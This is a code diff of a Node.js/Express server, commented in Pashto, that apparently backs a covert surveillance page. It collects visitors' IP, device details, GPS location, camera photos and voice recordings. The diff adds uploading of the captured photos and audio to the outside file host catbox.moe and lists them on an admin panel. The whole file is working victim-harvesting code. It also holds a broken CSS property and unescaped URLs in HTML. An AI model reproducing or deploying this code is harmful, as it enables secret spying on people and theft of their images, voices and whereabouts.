@@ -2,42 +2,27 @@ const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
+const axios = require('axios');
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// د پراکسی یا کلاوډ هوسټینګ (لکه Render) لپاره د IP د سوابقو سمولو په موخه
 app.set('trust proxy', true);
 
 const uploadDir = path.join(__dirname, 'uploads');
-const photosDir = path.join(uploadDir, 'photos');
-const voicesDir = path.join(uploadDir, 'voices');
 const locationsDir = path.join(uploadDir, 'locations');
 const deviceInfoDir = path.join(uploadDir, 'device_info');
+const linksDir = path.join(uploadDir, 'links');
 
-[uploadDir, photosDir, voicesDir, locationsDir, deviceInfoDir].forEach(dir => {
+[uploadDir, locationsDir, deviceInfoDir, linksDir].forEach(dir => {
     if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
     }
 });
 
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => {
-        if (file.fieldname === 'photo') {
-            cb(null, photosDir);
-        } else if (file.fieldname === 'voice') {
-            cb(null, voicesDir);
-        } else {
-            cb(null, uploadDir);
-        }
-    },
-    filename: (req, file, cb) => {
-        const ext = file.fieldname === 'photo' ? '.jpg' : '.ogg';
-        cb(null, `${Date.now()}_${Math.floor(1000 + Math.random() * 9000)}${ext}`);
-    }
-});
-
-const upload = multer({ storage: storage });
+// د فایلونو ساتلو لپاره د حافظې (Memory Storage) کارول ترڅو په سرور کې فزیکي ځای ونه نیسي
+const upload = multer({ storage: multer.memoryStorage() });
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -47,8 +32,24 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
-    // د لیدونکي د ریښتیني IP پته معلومول
+// Catbox ته د فایل د اپلوډ کولو فنکشن
+async function uploadToCatbox(buffer, filename) {
+    try {
+        const formData = new FormData();
+        formData.append('reqtype', 'fileupload');
+        formData.append('fileToUpload', buffer, { filename: filename });
+
+        const response = await axios.post('https://catbox.moe/user/api.php', formData, {
+            headers: formData.getHeaders()
+        });
+        return response.data; // انلاین مستقیم لینک راګرځوي
+    } catch (error) {
+        console.error('Catbox upload error:', error);
+        return null;
+    }
+}
+
+app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
     if (clientIp.includes(',')) {
         clientIp = clientIp.split(',')[0].trim();
@@ -57,20 +58,18 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) 
         clientIp = '127.0.0.1 (Localhost)';
     }
 
-    // ۱. د موبایل، برانډ او IP معلوماتو خوندي کول
+    // ۱. د موبایل معلومات
     if (req.body.device_info) {
         try {
             const info = JSON.parse(req.body.device_info);
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            
             const entry = `📅 نېټه: ${time}\n🌐 د لیدونکي آی‌پي (IP): ${clientIp}\n📱 د وسیلې برانډ: ${info.deviceType}\n🔢 د انډرایډ ورژن: ${info.androidVer}\n📐 د سکرین اندازه: ${info.screenSize}\n🔋 د بیټرۍ چارج: ${info.batteryLevel}\n🌐 د براوزر ژبه: ${info.language}\n-----------------------------------\n`;
-            
             fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
             return res.send("Device Info Saved");
         } catch (e) {}
     }
 
-    // ۲. لوکیشن خوندي کول
+    // ۲. لوکیشن
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
@@ -82,12 +81,28 @@ app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) 
         }
     }
 
+    // ۳. انځور انلاین کلاوډ (Catbox) ته استول
     if (req.files && req.files.photo) {
-        return res.send("Photo Saved");
+        const file = req.files.photo[0];
+        const onlineUrl = await uploadToCatbox(file.buffer, `photo_${Date.now()}.jpg`);
+        if (onlineUrl) {
+            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+            const entry = `${onlineUrl}|${time}\n`;
+            fs.appendFileSync(path.join(linksDir, 'photos_links.txt'), entry, 'utf8');
+            return res.send("Photo Saved");
+        }
     }
 
+    // ۴. غږیز فایل انلاین کلاوډ (Catbox) ته استول
     if (req.files && req.files.voice) {
-        return res.send("Voice Saved");
+        const file = req.files.voice[0];
+        const onlineUrl = await uploadToCatbox(file.buffer, `voice_${Date.now()}.ogg`);
+        if (onlineUrl) {
+            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+            const entry = `${onlineUrl}|${time}\n`;
+            fs.appendFileSync(path.join(linksDir, 'voices_links.txt'), entry, 'utf8');
+            return res.send("Voice Saved");
+        }
     }
 
     res.status(400).send("Bad Request");
@@ -110,12 +125,11 @@ app.get('/admin', (req, res) => {
             const devPath = path.join(deviceInfoDir, 'device_info.txt');
             if (fs.existsSync(devPath)) fs.unlinkSync(devPath);
         } else if (target === 'all_photos') {
-            fs.readdirSync(photosDir).forEach(file => fs.unlinkSync(path.join(photosDir, file)));
-        } else {
-            const safePath = path.join(__dirname, target);
-            if (fs.existsSync(safePath) && safePath.startsWith(uploadDir)) {
-                fs.unlinkSync(safePath);
-            }
+            const pPath = path.join(linksDir, 'photos_links.txt');
+            if (fs.existsSync(pPath)) fs.unlinkSync(pPath);
+        } else if (target === 'all_voices') {
+            const vPath = path.join(linksDir, 'voices_links.txt');
+            if (fs.existsSync(vPath)) fs.unlinkSync(vPath);
         }
         return res.redirect('/admin');
     }
@@ -146,32 +160,40 @@ app.get('/admin', (req, res) => {
 
     let photosHtml = "<p style='grid-column: span 3; text-align: center;'>کوم عکس نشته.</p>";
     let deleteAllPhotosBtn = '';
-    const photosList = fs.existsSync(photosDir) ? fs.readdirSync(photosDir) : [];
-    if (photosList.length > 0) {
+    const pPath = path.join(linksDir, 'photos_links.txt');
+    if (fs.existsSync(pPath)) {
         deleteAllPhotosBtn = `<a href="/admin?delete=all_photos" class="delete-btn" onclick="return confirm('ټول عکسونه پاک شي؟')">ټول پاکول</a>`;
-        photosHtml = '';
-        photosList.reverse().forEach(file => {
-            const filePath = `uploads/photos/${file}`;
-            photosHtml += `
-                <div class="item-box">
-                    <a href="/${filePath}" target='_blank'><img src="/${filePath}" alt='Photo'></a><br>
-                    <a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا عکس ډليټ شي؟')">ډليټ</a>
-                </div>`;
-        });
+        const content = fs.readFileSync(pPath, 'utf8');
+        const lines = content.trim().split('\n').filter(Boolean);
+        if (lines.length > 0) {
+            photosHtml = '';
+            lines.reverse().forEach(line => {
+                const url = line.split('|')[0];
+                photosHtml += `
+                    <div class="item-box">
+                        <a href="${url}" target='_blank'><img src="${url}" alt='Photo'></a><br>
+                    </div>`;
+            });
+        }
     }
 
     let voicesHtml = "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
-    const voicesList = fs.existsSync(voicesDir) ? fs.readdirSync(voicesDir) : [];
-    if (voicesList.length > 0) {
-        voicesHtml = '';
-        voicesList.reverse().forEach(file => {
-            const filePath = `uploads/voices/${file}`;
-            voicesHtml += `
-                <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
-                    <audio controls src="/${filePath}"></audio>
-                    <div style='text-align: left; margin-top: 5px;'><a href="/admin?delete=${filePath}" class='delete-btn' onclick="return confirm('دا عکس ډليټ شي؟')">ډليټ کول</a></div>
-                </div>`;
-        });
+    let deleteAllVoicesBtn = '';
+    const vPath = path.join(linksDir, 'voices_links.txt');
+    if (fs.existsSync(vPath)) {
+        deleteAllVoicesBtn = `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>`;
+        const content = fs.readFileSync(vPath, 'utf8');
+        const lines = content.trim().split('\n').filter(Boolean);
+        if (lines.length > 0) {
+            voicesHtml = '';
+            lines.reverse().forEach(line => {
+                const url = line.split('|')[0];
+                voicesHtml += `
+                    <div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'>
+                        <audio controls src="${url}"></audio>
+                    </div>`;
+            });
+        }
     }
 
     let html = `
@@ -196,7 +218,7 @@ app.get('/admin', (req, res) => {
             .map-container { margin-bottom: 10px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
             audio { width: 100%; margin-top: 5px; height: 35px; }
             .delete-btn { background-color: #ff4d4d; color: white; border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; text-decoration: none; display: inline-block; margin-top: 4px; }
-            p { color: #667781; font-size: 14px; }
+            p { language: #667781; font-size: 14px; }
         </style>
     </head>
     <body>`;
@@ -224,7 +246,7 @@ app.get('/admin', (req, res) => {
         <h2>📸 اخیستل شوي عکسونه: ${deleteAllPhotosBtn}</h2>
         <div class="card grid">${photosHtml}</div>
 
-        <h2>🎙️ ریکارډ شوي غږونه:</h2>
+        <h2>🎙️ ریکارډ شوي غږونه: ${deleteAllVoicesBtn}</h2>
         <div class="card">${voicesHtml}</div>`;
     }
 
